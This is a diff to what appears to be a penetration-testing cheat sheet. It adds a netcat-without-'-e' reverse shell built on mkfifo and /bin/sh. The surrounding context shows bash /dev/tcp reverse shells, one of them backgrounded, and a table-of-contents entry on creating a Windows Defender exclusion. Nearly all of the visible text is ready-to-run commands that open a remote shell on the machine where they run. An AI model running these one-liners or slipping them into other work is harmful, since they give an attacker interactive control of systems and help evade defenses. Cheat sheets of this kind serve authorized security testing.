@@ -16,6 +16,7 @@ author_profile: true
   - [Create a Windows Defender exclusion](#create-a-windows-defender-exclusion)
 - [Shells](#shells)
   - [Bash](#bash)
+  - [nc no e](#nc-no-e)
   - [Perl](#perl)
   - [Python](#python)
   - [PHP](#php)
@@ -77,6 +78,10 @@ bash -i >& /dev/tcp/10.0.0.1/8888 0>&1
 Background process
 ```
 bash -c '(bash -i >& /dev/tcp/10.0.0.1/8888 0>&1)&'
+```
+### nc no e
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444
 ```
 ### Perl
 ```
